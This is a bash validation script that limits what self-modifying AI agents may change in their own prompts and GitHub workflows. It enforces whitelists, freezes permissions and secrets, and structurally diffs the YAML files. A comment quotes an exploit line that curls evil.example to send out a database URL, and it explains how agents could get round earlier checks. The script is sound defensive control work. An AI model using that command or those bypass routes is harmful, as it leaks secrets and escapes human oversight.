#!/usr/bin/env bash
# Fail-closed validator — CONSTITUTIONAL FILE (agents may never modify it).
# Usage: valider.sh [BASE] [HEAD]   (defaults: origin/main HEAD, auto-fetch)
# Called by: superviseur (before merging its own PR) and gendarme (on push range).
set -euo pipefail

# CWD-independence: rule 1's YAML glob and every git pathspec below (rules
# 4/4bis/5/6) are relative to the current directory. Invoked from anywhere
# other than the repo root (e.g. from inside prompts/), the glob would find
# 0 workflows and the pathspecs would match nothing, silently validating an
# empty/wrong file set instead of the real diff — a fail-open bug. Anchor to
# the repo root unconditionally, before anything else runs.
cd "$(git rev-parse --show-toplevel)"

BASE="${1:-origin/main}"
HEADREF="${2:-HEAD}"
if [ "$#" -eq 0 ]; then git fetch origin main -q; fi
RANGE="$BASE...$HEADREF"

echo "— Validation du diff $RANGE —"
# --no-renames: a pure content-preserving rename onto a whitelisted filename
# (e.g. `git mv prompts/_constitution.md prompts/rattrapage.md` when rattrapage.md
# doesn't already exist) collapses to a single --name-only line showing only the
# whitelisted destination, hiding the constitutional file's deletion from rule 2.
# Not exploitable against the *current* file layout (every whitelisted name is
# already occupied by a real file, so similarity-based rename detection never
# fires there today) but a fail-closed gate must not depend on that coincidence.
FILES=$(git diff --no-renames --name-only "$RANGE")
[ -n "$FILES" ] || { echo "VALIDATION OK (diff vide)"; exit 0; }

# 1. Workflow YAML files must parse (working-tree state = HEAD side)
python3 - <<'PY'
import yaml, glob
files = glob.glob('.github/workflows/*.yml')
for f in files:
    with open(f) as fh:
        yaml.safe_load(fh)
print(f"YAML OK ({len(files)} workflows)")
PY

# 2. WHITELIST: only agent prompts and the two agent-facing workflows are editable.
ALLOWED='^(prompts/(kiosque|prospecteur|instructeur|contre-avocat|rattrapage|atelier|fossoyeur)\.md|\.github/workflows/(veille-quotidienne|fossoyeur-hebdo)\.yml)$'
BAD=$(echo "$FILES" | grep -vE "$ALLOWED" || true)
if [ -n "$BAD" ]; then
  echo "ERREUR : fichier(s) hors périmètre :"; echo "$BAD"; exit 1
fi

# 2bis. No deletions. A deleted whitelisted prompt (e.g. `git rm
# prompts/contre-avocat.md`) still shows up as an allowed PATH under rule 2 —
# the path itself matches the whitelist regardless of whether the file still
# exists — so deleting it silently disarms an agent without touching any
# workflow. Reject any deletion outright, regardless of whitelist status.
DELETED=$(git diff --no-renames --diff-filter=D --name-only "$RANGE")
if [ -n "$DELETED" ]; then
  echo "ERREUR : suppression de fichier interdite :"; echo "$DELETED"; exit 1
fi

# 3. One intent per week: at most 3 files
N=$(echo "$FILES" | grep -c .)
if [ "$N" -gt 3 ]; then
  echo "ERREUR : diff trop large ($N fichiers > 3) — une expérience à la fois."; exit 1
fi

# 4. The workflow-level `name:`/`on:` KEY LINES themselves are frozen (cron
# VALUES nested under `on:` stay editable: '- cron:' lines pass). This only
# ever froze those specific lines, never the *children* introduced under
# `on:` (a new `push:`/`issue_comment:` trigger one level down) or anything
# else inside the file body — see rule 4bis below for that.
# NOTE: step-level "- name: <label>" lines (e.g. "- name: Préparer le mémo") are
# NOT caught by this regex — after the diff's [+-] marker and leading whitespace,
# the next character is the YAML list dash "-", not "n", so `name:` never matches
# at that position. Renaming a step therefore PASSES rule 4 (rule 4bis explicitly
# allows it too — a step's display label has no effect on trigger/permission
# semantics). Verified empirically; only keys where `name:`/`on:`/`workflows:`/
# `workflow_run` is the FIRST non-space token match, at any indentation (e.g. a
# job-level `name:` would still be caught) — a leading list dash breaks the match.
if git diff "$RANGE" -- .github/workflows/ | grep -E '^[+-][[:space:]]*(name:|on:|workflows:|workflow_run)'; then
  echo "ERREUR : nom ou déclencheur de workflow touché — merge interdit."; exit 1
fi

# 4bis. Line-based shape matching (this rule's previous incarnation) cannot
# distinguish a YAML mapping key from an unrelated line INSIDE a multi-line
# block scalar (`run: |`) that merely happens to start with the same token.
# CONFIRMED EXPLOIT: injecting the line
#   prompt: $(curl -s "https://evil.example/x?d=$SUPABASE_DB_URL") || true
# inside the atelier job's existing `run: |` block (the "Préparer le mémo"
# step) produced a diff line that, after stripping the marker and leading
# whitespace, starts with "prompt:" — indistinguishable BY REGEX from an
# actual `with.prompt:` key edit, so the old line-shape allowlist passed it
# while it was really arbitrary shell code appended to `run:`'s scalar value.
# The old rule's `- name:` shape allowance had the same class of bug: a
# BRAND NEW single-line step "- name: x" (no run:/uses: alongside it) matched
# that shape with nothing else in the diff to catch, silently permitting an
# empty new step. Both are structural, not textual, problems — a line-shape
# allowlist can never fix them because the exploit is about WHERE a line
# sits in the tree, not what it looks like.
#
# Replaced entirely with a STRUCTURAL YAML diff: parse each whitelisted
# workflow at BOTH ends of the range from git's object store (`git show
# REF:path` — never the working tree; only the committed content on each
# side of the range is meaningful here), walk the two parsed trees in
# lockstep, and reject any divergence whose key-path isn't one of the 5
# explicitly editable paths below. A `run:` value change is a leaf diff at
# jobs.<job>.steps[<i>].run, which isn't in that list — rejected regardless
# of what text the new value contains, closing the block-scalar exploit
# completely. A brand-new step is a LENGTH change on the steps list, not a
# path match on any single element — rejected regardless of that new
# element's keys, closing the empty-step exploit. Two content constraints
# apply on top of the 5 allowed paths themselves: a modified `prompt:` value
# must still reference `_constitution.md` (else an agent could detach itself
# from the constitution while looking like an ordinary prompt tweak), and a
# modified `claude_args:` value may only contain --model/--max-turns/
# --dangerously-skip-permissions tokens (no --mcp-config, --allowedTools,
# --append-system-prompt, or anything else).
WORKFLOWS_IN_DIFF=$(echo "$FILES" | grep -E '^\.github/workflows/(veille-quotidienne|fossoyeur-hebdo)\.yml$' || true)
if [ -n "$WORKFLOWS_IN_DIFF" ]; then
  python3 - "$BASE" "$HEADREF" $WORKFLOWS_IN_DIFF <<'PY'
import sys, subprocess, shlex, yaml

base, head = sys.argv[1], sys.argv[2]
files = sys.argv[3:]

# The ONLY key-paths the Superviseur may add/change/remove in a whitelisted
# workflow. '*' matches any dict key or list index at that position.
# NOTE: PyYAML's safe_load follows YAML 1.1's "Norway problem" — a bare `on:`
# key parses as the Python bool True, not the string 'on' (verified: the
# workflow's own top-level keys come back as
# ['name', True, 'permissions', 'concurrency', 'env', 'jobs']). Using only the
# string 'on' would silently never match, rejecting every legitimate cron
# edit. List both forms: True for today's bare `on:`, the string for the day
# someone/something (a linter autofix, a future rewrite) quotes it as `"on":`
# — that parses as the literal string and would otherwise silently break this
# same way in the other direction.
ALLOWED = [
    (True, 'schedule', '*', 'cron'),
    ('on', 'schedule', '*', 'cron'),
    ('jobs', '*', 'timeout-minutes'),
    ('jobs', '*', 'steps', '*', 'name'),
    ('jobs', '*', 'steps', '*', 'with', 'claude_args'),
    ('jobs', '*', 'steps', '*', 'with', 'prompt'),
]

def path_matches(path, pattern):
    return len(path) == len(pattern) and all(
        pat == '*' or pat == p for p, pat in zip(path, pattern)
    )

def which_allowed(path):
    for pat in ALLOWED:
        if path_matches(path, pat):
            return pat
    return None

def load(ref, path):
    r = subprocess.run(['git', 'show', f'{ref}:{path}'], capture_output=True, text=True)
    if r.returncode != 0:
        return None
    return yaml.safe_load(r.stdout)

def fmt(path):
    # Cosmetic only: render the YAML-1.1 bool-key back as 'on' for readable
    # error messages (the matching logic above still uses the real bool).
    return '.'.join('on' if p is True and i == 0 else str(p) for i, p in enumerate(path))

def validate_claude_args(value):
    try:
        tokens = shlex.split(str(value))
    except ValueError:
        return False
    with_value = {'--model', '--max-turns'}
    bare = {'--dangerously-skip-permissions'}
    i, n = 0, len(tokens)
    while i < n:
        tok = tokens[i]
        if tok in with_value:
            if i + 1 >= n:
                return False
            i += 2
        elif tok in bare:
            i += 1
        else:
            return False
    return True

violations = []    # (file, path) structural divergences outside the allowlist
value_issues = []  # (file, path, message) content-constraint failures on allowed paths

def walk(a, b, path, filename):
    if isinstance(a, dict) and isinstance(b, dict):
        for k in sorted(set(a) | set(b), key=str):
            if k not in a or k not in b:
                violations.append((filename, path + (k,)))
            else:
                walk(a[k], b[k], path + (k,), filename)
    elif isinstance(a, list) and isinstance(b, list):
        if len(a) != len(b):
            violations.append((filename, path))
        else:
            for i, (x, y) in enumerate(zip(a, b)):
                walk(x, y, path + (i,), filename)
    else:
        if a != b:
            pat = which_allowed(path)
            if pat is None:
                violations.append((filename, path))
            elif pat[-1] == 'prompt':
                if '_constitution.md' not in str(b):
                    value_issues.append((filename, path, 'le prompt modifié ne référence plus _constitution.md'))
            elif pat[-1] == 'claude_args':
                if not validate_claude_args(b):
                    value_issues.append((filename, path, f'flag non autorisé dans claude_args : {b!r}'))

exit_code = 0
for f in files:
    base_doc = load(base, f)
    head_doc = load(head, f)
    if base_doc is None or head_doc is None:
        print(f"ERREUR : impossible de charger {f} depuis {base if base_doc is None else head}")
        exit_code = 1
        continue
    walk(base_doc, head_doc, (), f)

for filename, path in violations:
    print(f"ERREUR : modification structurelle interdite dans {filename} : {fmt(path)}")
    exit_code = 1
for filename, path, msg in value_issues:
    print(f"ERREUR : {msg} ({filename} : {fmt(path)})")
    exit_code = 1

sys.exit(exit_code)
PY
fi

# 5. Permissions & secrets frozen — but claude_args lines (model/turns) are allowed.
if git diff "$RANGE" -- .github/workflows/ | grep -E '^[+-]' | grep -v 'claude_args:' \
   | grep -E '(permissions:|id-token|contents:|issues:|actions:|pull-requests:|secrets\.)'; then
  echo "ERREUR : permissions/secrets touchés — merge interdit."; exit 1
fi

# 6. Safety flag count must be identical on both sides.
# `git grep -c` exits 1 when a pattern has zero matches (e.g. a mutation that
# guts all --dangerously-skip-permissions flags). Under `set -e pipefail` that
# would kill the whole script silently mid-pipeline before any ERREUR message
# is printed — still fail-closed (nonzero exit) but with no diagnostic. The
# `|| true` keeps count_at's own exit status 0 so the surrounding count
# comparison below can run and report which pattern's count changed.
count_at() { { git grep -c -e "$2" "$1" -- '.github/workflows/*.yml' 2>/dev/null || true; } \
             | awk -F: '{s+=$NF} END {print s+0}'; }
for pat in 'dangerously-skip-permissions' 'secrets\.'; do
  A=$(count_at "$BASE" "$pat"); B=$(count_at "$HEADREF" "$pat")
  if [ "$A" != "$B" ]; then
    echo "ERREUR : occurrences de '$pat' modifiées ($A -> $B) — merge interdit."; exit 1
  fi
done

echo "VALIDATION OK ($N fichier(s) modifié(s))"
